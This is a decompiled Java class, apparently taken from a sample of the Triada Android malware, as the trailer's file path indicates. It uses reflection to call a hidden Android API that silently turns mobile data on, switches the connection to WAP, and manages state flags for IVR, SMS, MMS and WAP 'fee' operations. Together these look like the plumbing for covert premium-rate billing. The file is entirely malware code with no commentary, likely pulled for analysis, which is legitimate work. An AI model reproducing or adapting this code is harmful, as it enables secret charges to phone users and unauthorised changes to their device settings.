package com.android.essdk.eyou.e;

import android.content.Context;
import android.net.ConnectivityManager;
import com.android.essdk.eyou.a.a;
import com.android.essdk.eyou.f.a;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class e {
  public static int a = -1;
  
  public static void a(Context paramContext, boolean paramBoolean) {
    ConnectivityManager connectivityManager = (ConnectivityManager)paramContext.getSystemService("connectivity");
    try {
      Field field = Class.forName(connectivityManager.getClass().getName()).getDeclaredField("mService");
      field.setAccessible(true);
      Object object = field.get(connectivityManager);
      Method method = Class.forName(object.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[] { boolean.class });
      method.setAccessible(true);
      method.invoke(object, new Object[] { Boolean.valueOf(paramBoolean) });
    } catch (ClassNotFoundException classNotFoundException) {
      b.f("==", "ClassNotFoundException");
      classNotFoundException.printStackTrace();
    } catch (NoSuchFieldException noSuchFieldException) {
      b.f("==", "NoSuchFieldException");
      noSuchFieldException.printStackTrace();
    } catch (SecurityException securityException) {
      b.f("==", "SecurityException");
      securityException.printStackTrace();
    } catch (NoSuchMethodException noSuchMethodException) {
      b.f("==", "NoSuchMethodException");
      noSuchMethodException.printStackTrace();
    } catch (IllegalArgumentException illegalArgumentException) {
      b.f("==", "IllegalArgumentException");
      illegalArgumentException.printStackTrace();
    } catch (IllegalAccessException illegalAccessException) {
      b.f("==", "IllegalAccessException");
      illegalAccessException.printStackTrace();
    } catch (InvocationTargetException invocationTargetException) {
      b.f("==", "InvocationTargetException");
      invocationTargetException.printStackTrace();
    } 
  }
  
  public static boolean a(Context paramContext) {
    boolean bool = true;
    if (a == -1) {
      b.f("startWFee", "初始化网络....");
      m m = new m(paramContext);
      a a = new a(paramContext);
      if (!m.b()) {
        if (!a.g()) {
          b.f("startWFee", "移动网络没有打开，正在打开移动网络....");
          a(paramContext, true);
          if (a != 1)
            a = 0; 
        } 
        if (!a.a()) {
          b.f("startFee", "set WAP");
          if (!a.f())
            bool = false; 
          return bool;
        } 
        b.f("startFee", "current is WAP");
        return bool;
      } 
      bool = false;
    } 
    return bool;
  }
  
  public static void b(Context paramContext) {
    if (a.a || a.b || a.c || a.d) {
      b.f("===", "IVR_FEEING " + a.a + " , SMS_FEEING " + a.b + " , MMS_FEEING " + a.c + " , WAP_FEEING " + a.d);
      return;
    } 
    c(paramContext);
  }
  
  public static void c(Context paramContext) {
    m m;
    if (a != -1) {
      b.f("", "开始恢复网络：" + a);
      m = new m(paramContext);
      switch (a) {
        default:
          a = -1;
          return;
        case 1:
          m.a();
        case 2:
          m.c();
          a(paramContext, true);
        case 0:
          break;
      } 
    } else {
      return;
    } 
    m.c();
    a(paramContext, false);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/e/e.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */